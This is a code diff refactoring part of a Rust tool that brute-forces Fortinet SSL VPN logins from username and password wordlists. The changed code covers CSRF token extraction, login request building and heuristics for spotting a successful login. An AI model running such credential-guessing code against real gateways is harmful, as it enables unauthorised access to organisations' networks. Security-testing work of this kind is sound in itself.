@@ -5,7 +5,6 @@ use reqwest::{ClientBuilder, redirect::Policy};
 use std::{
     fs::File,
     io::Write,
-    path::{Path, PathBuf},
     sync::Arc,
     sync::atomic::{AtomicBool, Ordering},
     time::Duration,
@@ -17,8 +16,10 @@ use tokio::{
 use crate::utils::{
     prompt_yes_no, prompt_default, prompt_int_range,
     load_lines, prompt_wordlist, normalize_target,
+    get_filename_in_current_dir, prompt_port,
 };
 use regex::Regex;
+use once_cell::sync::Lazy;
 use crate::modules::creds::utils::BruteforceStats;
 
 const PROGRESS_INTERVAL_SECS: u64 = 2;
@@ -35,8 +36,7 @@ pub async fn run(target: &str) -> Result<()> {
     display_banner();
     println!("{}", format!("[*] Target: {}", target).cyan());
 
-    let port: u16 = prompt_default("Fortinet VPN Port", "443").await?
-        .parse().unwrap_or(443);
+    let port: u16 = prompt_port("Fortinet VPN Port", 443).await?;
 
     let usernames_file_path = prompt_wordlist("Username wordlist path").await?;
     let passwords_file_path = prompt_wordlist("Password wordlist path").await?;
@@ -198,8 +198,10 @@ async fn spawn_fortinet_task(
     stop_on_success: bool,
     timeout: Duration
 ) {
-    let permit = semaphore.clone().acquire_owned().await.ok();
-    if permit.is_none() { return; }
+    let permit = match semaphore.clone().acquire_owned().await {
+        Ok(p) => p,
+        Err(_) => return, // Semaphore closed, stop processing
+    };
 
     tasks.push(tokio::spawn(async move {
         let _permit = permit;
@@ -294,12 +296,12 @@ async fn try_fortinet_login(
     // Send login request
     let login_url = format!("{}/remote/logincheck", base_url);
     
-    // Manual form construction
-    let mut body = String::new();
+    // Build form body
+    let mut form_pairs: Vec<String> = Vec::new();
     for (key, val) in &form_data {
-        if !body.is_empty() { body.push('&'); }
-        body.push_str(&format!("{}={}", key, urlencoding::encode(val)));
+        form_pairs.push(format!("{}={}", key, urlencoding::encode(val)));
     }
+    let body = form_pairs.join("&");
 
     let login_response = match timeout(
         timeout_duration,
@@ -337,38 +339,28 @@ async fn try_fortinet_login(
         Err(_) => return Err(anyhow!("Timeout reading login response")),
     };
 
-    // Check for success indicators
-    if response_body.contains("redir") 
-        || response_body.contains("\"1\"") 
-        || response_body.contains("success")
-        || response_body.contains("/remote/index")
-        || response_body.contains("portal")
-    {
+    // Check for explicit success indicators
+    let success_indicators = ["redir", "\"1\"", "success", "/remote/index", "portal"];
+    if success_indicators.iter().any(|&indicator| response_body.contains(indicator)) {
         return Ok(true);
     }
 
-    // Check for failure indicators
-    if response_body.contains("error") 
-        || response_body.contains("invalid") 
-        || response_body.contains("failed")
-        || response_body.contains("incorrect")
-        || response_body.contains("\"0\"")
-    {
+    // Check for explicit failure indicators
+    let failure_indicators = ["error", "invalid", "failed", "incorrect", "\"0\""];
+    if failure_indicators.iter().any(|&indicator| response_body.contains(indicator)) {
         return Ok(false);
     }
 
-    // Check status and cookies
+    // Check status code and authentication cookies
     if status.is_success() && has_auth_cookie {
         return Ok(true);
     }
 
-    // Check redirect location
+    // Check redirect location for success
     if status.as_u16() == 302 {
         if let Some(loc_str) = location_header {
-            if loc_str.contains("/remote/index") 
-                || loc_str.contains("portal")
-                || loc_str.contains("index")
-            {
+            let success_redirects = ["/remote/index", "portal", "index"];
+            if success_redirects.iter().any(|&path| loc_str.contains(path)) {
                 return Ok(true);
             }
         }
@@ -377,21 +369,21 @@ async fn try_fortinet_login(
     Ok(false)
 }
 
-/// Extracts CSRF token from HTML response
+/// Extracts CSRF token from HTML response using pre-compiled regex patterns
 fn extract_csrf_token(html: &str) -> Option<String> {
-    let patterns = vec![
-        r#"name="magic"\s+value="([^"]+)""#,
-        r#"name="csrf_token"\s+value="([^"]+)""#,
-        r#""magic"\s*:\s*"([^"]+)""#,
-        r#"magic=([^&\s"]+)"#,
-    ];
+    static CSRF_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
+        vec![
+            Regex::new(r#"name="magic"\s+value="([^"]+)""#).expect("Invalid regex pattern"),
+            Regex::new(r#"name="csrf_token"\s+value="([^"]+)""#).expect("Invalid regex pattern"),
+            Regex::new(r#""magic"\s*:\s*"([^"]+)""#).expect("Invalid regex pattern"),
+            Regex::new(r#"magic=([^&\s"]+)"#).expect("Invalid regex pattern"),
+        ]
+    });
 
-    for pattern in patterns {
-        if let Ok(re) = Regex::new(pattern) {
-            if let Some(captures) = re.captures(html) {
-                if let Some(token) = captures.get(1) {
-                    return Some(token.as_str().to_string());
-                }
+    for pattern in CSRF_PATTERNS.iter() {
+        if let Some(captures) = pattern.captures(html) {
+            if let Some(token) = captures.get(1) {
+                return Some(token.as_str().to_string());
             }
         }
     }
@@ -405,7 +397,12 @@ fn build_fortinet_url(target: &str, port: u16) -> Result<String> {
     
     // Check if port is already present
     let has_port = if normalized_host.starts_with('[') {
-        normalized_host.rfind(':').map(|i| i > normalized_host.rfind(']').unwrap_or(0)).unwrap_or(false)
+        // IPv6 case: check if there's a colon after the closing bracket
+        if let Some(bracket_pos) = normalized_host.rfind(']') {
+            normalized_host[bracket_pos..].contains(':')
+        } else {
+            false
+        }
     } else {
         normalized_host.contains(':')
     };
@@ -417,13 +414,4 @@ fn build_fortinet_url(target: &str, port: u16) -> Result<String> {
     };
     
     Ok(url)
-}
-
-fn get_filename_in_current_dir(input: &str) -> PathBuf {
-    let name = Path::new(input)
-        .file_name()
-        .unwrap_or_default()
-        .to_string_lossy()
-        .to_string();
-    PathBuf::from(format!("./{}", name))
 }
